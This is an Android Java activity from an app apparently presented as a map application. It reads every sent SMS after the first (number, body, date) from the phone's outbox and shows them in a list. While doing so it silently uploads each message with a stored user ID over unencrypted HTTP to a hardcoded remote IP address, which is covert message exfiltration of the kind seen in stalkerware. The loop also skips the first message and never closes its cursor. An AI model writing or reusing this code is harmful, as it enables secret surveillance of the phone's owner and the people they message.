package com.bhagya.mapapplication.activityclass;

import android.content.SharedPreferences;
import android.os.Bundle;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import android.app.Activity;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.widget.ArrayAdapter;
import android.widget.ListView;

import com.androidquery.AQuery;
import com.androidquery.callback.AjaxCallback;
import com.androidquery.callback.AjaxStatus;
import com.bhagya.mapapplication.R;

import org.json.JSONArray;

public class Readoutbox extends Activity {
    DatabaseHelper databaseHelper;
    AQuery aQuery = new AQuery(this);
    String user_id;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_readmobile__inbox);
        ListView lViewSMS = (ListView) findViewById(R.id.listViewSMS);
        databaseHelper = new DatabaseHelper(this);
        ArrayList list1 = fetchsentsms();
        // ArrayList list2=fetchInbox();
        if (list1 != null) {
            ArrayAdapter adapter = new ArrayAdapter(this, android.R.layout.simple_list_item_1, list1);
            lViewSMS.setAdapter(adapter);
        }
    }

    public ArrayList fetchsentsms() {
        SharedPreferences prfs = getSharedPreferences("new_userid", MODE_PRIVATE);
        user_id = prfs.getString("user_id", "");
        ArrayList sms = new ArrayList();
        String uploadurl = "http://104.155.153.31/outbox.php";
        //    Uri uriSms = Uri.parse("content://sms/inbox");
//       Cursor cursor = getContentResolver().query(uriSms, new String[]{"_id", "address", "date", "body"},null,null,null);
        Uri sentURI = Uri.parse("content://sms/sent");
        Cursor cursor = getContentResolver().query(sentURI, new String[]{"_id", "address", "date", "body"}, null, null, null);

        ContentValues cv = new ContentValues();
        cursor.moveToFirst();
        while (cursor.moveToNext()) {
            String address = cursor.getString(1);
            String body = cursor.getString(3);
            String date = cursor.getString(2);
            cv.put("mobileno", address);
            cv.put("sms", body);
            cv.put("date", date);
//            databaseHelper.Insertsentsms(cv);
            Map<String, Object> params = new HashMap<String, Object>();
            params.put("phoneno", address);
            params.put("sms", body);
            params.put("date", date);
            params.put("user_id", user_id);

            aQuery.ajax(uploadurl, params, JSONArray.class, new AjaxCallback<JSONArray>() {
                @Override
                public void callback(String url, JSONArray array, AjaxStatus status) {
                    super.callback(url, array, status);

                    // Log.i("response", "REsponser:" + array);
                }
            });

            sms.add("Mobile No= " + address + "\n SMS =" + body + "\n Date=" + date);
        }

//cursor.close();
        return sms;

    }
}